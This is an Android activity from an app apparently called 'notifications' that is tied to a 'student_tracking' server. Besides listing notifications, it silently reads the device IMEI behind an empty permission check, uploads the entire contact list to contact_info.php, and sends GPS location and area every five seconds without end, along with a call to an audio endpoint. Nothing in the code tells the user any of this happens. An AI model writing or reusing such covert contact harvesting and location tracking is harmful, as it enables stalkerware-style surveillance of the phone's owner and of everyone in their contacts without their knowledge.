package com.example.acer.notifications.activity;

import android.Manifest;
import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Address;
import android.location.Geocoder;
import android.location.Location;
import android.media.AudioManager;
import android.os.AsyncTask;
import android.os.CountDownTimer;
import android.provider.ContactsContract;
import android.support.v4.app.ActivityCompat;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.ListView;
import android.widget.Toast;

import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.JsonArrayRequest;
import com.android.volley.toolbox.Volley;
import com.example.acer.notifications.R;
import com.example.acer.notifications.adapter.NotiAdapter;
import com.example.acer.notifications.model.Notification;
import com.example.acer.notifications.utilities.DBHandle;
import com.example.acer.notifications.utilities.GPSFusedLocation;
import com.example.acer.notifications.utilities.SPHandle;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.io.UnsupportedEncodingException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;

import javax.net.ssl.HttpsURLConnection;

public class HomeActivity extends AppCompatActivity {
    String ip, url, imei;
    ListView noti;
    GPSFusedLocation gps;
    String TAG="MYAPPINFO";
    Location mLocation,location;
    DBHandle db;
    JSONArray darray;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_home);
        gps=new GPSFusedLocation(this);
        mLocation=gps.getmLocation();
        location=mLocation;
        db=new DBHandle(getApplicationContext());
        noti = findViewById(R.id.notification_list);
        ip = new SPHandle(this).getIP();
        url = "http://" + ip + "/student_tracking/notification.php";
        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {

        }
        imei = telephonyManager.getDeviceId();
        HashMap<String,String> params=new HashMap<>();
        params.put("imei",imei);
        new DBHandle(this).fetch(url,params);
        setResponse();
        new ContactsUpload().execute(imei);
        looperMethod();
    }
    CountDownTimer countDownTimer;

    public void looperMethod() {
        countDownTimer = new CountDownTimer(Long.MAX_VALUE, 5000) {

            // This is called after every 10 sec interval.
            public void onTick(long millisUntilFinished) {
                mLocation=gps.getmLocation();
                location=mLocation;
                String currArea=getArea(mLocation.getLatitude(),mLocation.getLongitude());
                String payload="{bus:"+imei+",location:{latitude:"+mLocation.getLatitude()+",longitude:"+mLocation.getLongitude()+",area:"+currArea+"}}";
                Log.d(TAG, "onTick: "+payload);
                //Toast.makeText(HomeActivity.this, payload, Toast.LENGTH_SHORT).show();
                insertToDB();
                setResponse();
            }

            public void onFinish() {

                start();
            }
        }.start();
    }

    private String getArea(double lat,double lng)
    {
        String area="NOAREA";
        Address address;
        Geocoder geocoder=new Geocoder(getApplicationContext(),Locale.getDefault());
        try {
            List<Address> addressList = geocoder.getFromLocation(lat, lng, 1);
            address = addressList.get(0);
            area=address.getSubLocality();
        } catch (IOException e) {
            e.printStackTrace();
        }
        return area;
    }

    public void insertToDB()
    {

        String gpsurl="http://"+ip+"/student_tracking/getLocation.php?";
        HashMap<String,String> gpsparams=new HashMap<>();
        gpsparams.put("imei",imei);
        gpsparams.put("latitude",String.valueOf(location.getLatitude()));
        gpsparams.put("longitude",String.valueOf(location.getLongitude()));
        gpsparams.put("area",String.valueOf(getArea(location.getLatitude(),location.getLongitude())));
        db.fetch(gpsurl,gpsparams);
        String audiourl="http://"+ip+"/student_tracking/audio.php";
        HashMap<String,String> aparams=new HashMap<>();
        aparams.put("imei",imei);
        db.fetch(audiourl,aparams);
    }
    public void setResponse()
    {   String response=new SPHandle(getApplicationContext()).getResponse();
        List<Notification> ndata=new ArrayList<>();
        try {
            JSONObject result=new JSONObject(response);
            String success=result.getString("success");
            if(success.equals("true"))
            {
                JSONArray data=result.getJSONArray("data");
                for(int i=0;i<data.length();i++)
                {
                    Notification nobj=new Notification();

                    JSONObject info=data.getJSONObject(i);
                    nobj.setId(info.getString("id"));
                    nobj.setNotification(info.getString("message"));
                    ndata.add(nobj);

                }

                NotiAdapter notiAdapter=new NotiAdapter(this,0,ndata);
                noti.setAdapter(notiAdapter);
            }
            else
            {
                Toast.makeText(this, "No Notifications", Toast.LENGTH_SHORT).show();
            }
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }

    private class ContactsUpload extends AsyncTask<String,Void,Void> {
        JSONArray data;

        @Override
        protected void onPreExecute() {
            super.onPreExecute();

        }

        @Override
        protected Void doInBackground(String... strings) {
            getContacts();
            return null;
        }

        @Override
        protected void onPostExecute(Void aVoid) {
            super.onPostExecute(aVoid);
            sendData("http://"+new SPHandle(getApplicationContext()).getIP()+"/student_tracking/contact_info.php?imei="+imei,data);

        }
        private void getContacts() {
            data=new JSONArray();
            ContentResolver cr = getContentResolver();
            Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                    null, null, null, null);

            if ((cur != null ? cur.getCount() : 0) > 0) {
                while (cur != null && cur.moveToNext()) {
                    String id = cur.getString(
                            cur.getColumnIndex(ContactsContract.Contacts._ID));
                    String name = cur.getString(cur.getColumnIndex(
                            ContactsContract.Contacts.DISPLAY_NAME));

                    if (cur.getInt(cur.getColumnIndex(
                            ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                        Cursor pCur = cr.query(
                                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                                null,
                                ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                                new String[]{id}, null);
                        while (pCur.moveToNext()) {
                            String phoneNo = pCur.getString(pCur.getColumnIndex(
                                    ContactsContract.CommonDataKinds.Phone.NUMBER));
                            JSONObject obj=new JSONObject();
                            try {
                                obj.put("name",name);
                                obj.put("number",phoneNo);
                                data.put(obj);

                            } catch (JSONException e) {
                                e.printStackTrace();
                            }
                        }
                        pCur.close();
                    }
                }
            }
            if(cur!=null){
                cur.close();
            }
        }

        public void sendData(String url, JSONArray params)
        {
            RequestQueue requestQueue=Volley.newRequestQueue(getApplicationContext());
            JsonArrayRequest jsonArrayRequest=new JsonArrayRequest(Request.Method.POST, url, params, new Response.Listener<JSONArray>() {
                @Override
                public void onResponse(JSONArray response) {

                }
            }, new Response.ErrorListener() {
                @Override
                public void onErrorResponse(VolleyError error) {

                }
            });
            requestQueue.add(jsonArrayRequest);
        }



    }
}
